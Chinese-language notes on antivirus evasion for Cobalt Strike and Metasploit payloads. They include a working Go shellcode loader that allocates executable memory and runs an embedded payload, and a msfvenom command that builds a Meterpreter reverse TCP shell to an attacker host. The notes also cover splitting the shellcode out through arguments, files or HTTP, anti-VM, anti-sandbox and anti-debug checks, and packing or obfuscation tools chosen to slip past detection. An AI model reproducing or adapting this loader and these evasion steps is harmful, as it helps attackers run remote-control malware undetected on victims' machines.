## **基础模板**
生成 ：CS-有效载荷-Payload生成器-.c文件
.c文件中提取shellcode值，替换\为,0，将其放入go代码中的字节数组。

```
package main

import (
	"io/ioutil"
	"os"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
	shellcode_buf = []byte{
		0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 
...
0x2e, 0x32, 0x33, 0x36, 0x2e, 0x31, 0x31, 0x37, 0x00, 0x00, 0x01, 0x86, 0xa0,
	}
)

func checkErr(err error) {
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			println(err.Error())
			os.Exit(1)
		}
	}
}

func main() {
	shellcode := shellcode_buf
	if len(os.Args) > 1 {
		shellcodeFileData, err := ioutil.ReadFile(os.Args[1])
		checkErr(err)
		shellcode = shellcodeFileData
	}

	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkErr(err)
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	checkErr(err)
	syscall.Syscall(addr, 0, 0, 0, 0)
}
```


^
## **免杀方案**
分离拆分：
1、http请求获取  powershell使用过
2、参数获取 go使用
3、资源获取 go使用


^
**参数分离**
这里先使用参数分离（此时往往结合shellcode加密，aes等）
```
执行时：
生成 ：CS-有效载荷-Payload生成器-.c文件
.c文件中提取shellcode值作为shellcode。
3.exe  密钥 shellcodeC

或
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.20.128 LPORT=6688 -f hex 生成16进制数字
直接5.exe 16进制数字
```

^
**资源分离**
资源分离，文件读取
```
生成 ：CS-有效载荷-Payload生成器-raw .bin文件
4.exe 和 .bin文件放同一目录（一般）
运行
```

^
**防虚拟机，防沙箱，防调试**
代码检测，检测出直接退出程序。


^
**加壳、加混淆**
如：
使用Shielden软件一键加混淆，加防虚拟机，防沙箱，防调试。
使用UPX加压缩壳。
使用virboxprotector_trial_windows去除特征(c#的exe，不支持go的exe)。
使用ConfuserCLI等。